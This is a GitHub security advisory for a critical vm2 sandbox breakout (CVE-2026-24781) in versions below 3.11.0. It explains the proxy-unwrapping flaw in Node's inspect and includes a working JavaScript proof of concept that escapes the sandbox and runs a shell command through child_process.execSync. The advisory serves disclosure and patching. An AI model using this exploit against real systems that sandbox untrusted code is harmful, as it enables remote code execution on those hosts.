# [C] VM2 Has Sandbox Breakout Through Inspect Function

## Summary
Severity: Critical
Advisory: GHSA-v37h-5mfm-c47c
CVE: CVE-2026-24781
CWE: CWE-693, CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-v37h-5mfm-c47c
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.11.0

## Details
### Summary

VM2 suffers from a sandbox breakout vulnerability through the `inspect` function. This allows attackers to write code which can escape from the VM2 sandbox and execute arbitrary commands on the host system.

### Details

The node `inspect` method allows to log details of objects. To get to the details, the implementation unwraps proxies. The unwrapped values can be extracted using the `this.seen` of the `stylize` function. This allows to get access to the internal proxy handler of VM2 which contains the sandbox object. Since the access to the handler is itself wrapped by a VM2 proxy, accessing the sandbox object in the proxy handler will result in a wrapped sandbox object given into the sandbox. This allows to write a wrapped host object to the wrapped sandbox object and read the raw host object from the raw sandbox object bypassing the proxy bridge.

### PoC

```js
const obj = {
	subarray: Buffer.prototype.inspect,
	slice: Buffer.prototype.slice,
	hexSlice:()=>'',
	l:{__proto__: null}
};

obj.slice(20, {showHidden: true, showProxy: true, depth: 10, stylize(a) {
	if (this.seen?.[1]?.objectWrapper) this.seen[1].objectWrapper().x = obj.slice;
	return a;
}});
obj.l.x.constructor("return process")().mainModule.require('child_process').execSync('touch pwned');
```

### Impact

Attackers can perform Remote Code Execution under the assumption that arbitrary code can be executed inside the context of a vm2 sandbox.

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-v37h-5mfm-c47c
- https://nvd.nist.gov/vuln/detail/CVE-2026-24781
- https://github.com/patriksimek/vm2/commit/8d30d93213c1898b3e035298b89a814970dd1189
- https://github.com/patriksimek/vm2/commit/bdd3d15e57bc4ec5e70365cd79f7cb0256e5f88c
- https://github.com/patriksimek/vm2/commit/fd266d084e0a3322d0f71ba2a8dc4c96cd030228
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/v3.11.0
